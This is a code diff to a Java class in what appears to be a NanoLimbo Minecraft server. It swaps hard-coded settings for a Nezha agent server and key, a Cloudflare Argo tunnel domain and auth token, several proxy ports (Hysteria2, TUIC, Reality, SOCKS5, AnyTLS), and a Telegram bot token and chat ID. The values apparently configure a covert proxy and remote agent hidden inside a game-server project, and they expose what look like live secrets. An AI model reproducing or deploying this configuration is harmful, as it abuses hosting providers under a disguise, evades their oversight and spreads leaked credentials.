@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "336b7cf0-f07c-443e-bcc6-a32a97b3dabd");
+        envVars.put("UUID", "0ca1ec6f-3a89-4299-9bb1-e543453291eb");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
         envVars.put("ARGO_PORT", "9123");
-        envVars.put("ARGO_DOMAIN", "hiden-au.yvy.pp.ua");
-        envVars.put("ARGO_AUTH", "eyJhIjoiZGU1MjNmOTcwODg5ZTY1OTU3NjFlNDAyODdmNjExZTYiLCJ0IjoiMjFiODEwZWQtYTYzMS00MDgyLWFkM2UtMDczYmYyMzYwN2YwIiwicyI6Ik5XWmpZbUk1TnpndFpUbGtZeTAwTXpoaExXSTVPR1F0TTJZMk1UWmpaak15TURJMyJ9");
-        envVars.put("HY2_PORT", "24604");
-        envVars.put("TUIC_PORT", "24602");
-        envVars.put("REALITY_PORT", "24602");
-        envVars.put("S5_PORT", "24604");
-        envVars.put("ANYTLS_PORT", "");
+        envVars.put("ARGO_DOMAIN", "alt-uk.qos.pp.ua");
+        envVars.put("ARGO_AUTH", "eyJhIjoiZjBiNmU2YTM4NmE2NWMzNzI2NWE2N2NjYTQ1ZGYzZGUiLCJ0IjoiMzNlZGU0MTUtMzc5MS00NTBiLWFmNTctNGVjZGMwZjc2NmVhIiwicyI6IlpESmpZV00yTkRBdFpEQTBNeTAwTlRGbExXRmtORGt0TVRneU9XWTBOalZrTWpSbSJ9");
+        envVars.put("HY2_PORT", "25049");
+        envVars.put("TUIC_PORT", "25282");
+        envVars.put("REALITY_PORT", "25282");
+        envVars.put("S5_PORT", "25049");
+        envVars.put("ANYTLS_PORT", "25401");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "5958841738");
         envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "Hiden-AU");
+        envVars.put("NAME", "Altare");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -208,6 +208,7 @@ public final class NanoLimbo {
     }
 
 }
+
 
 
 
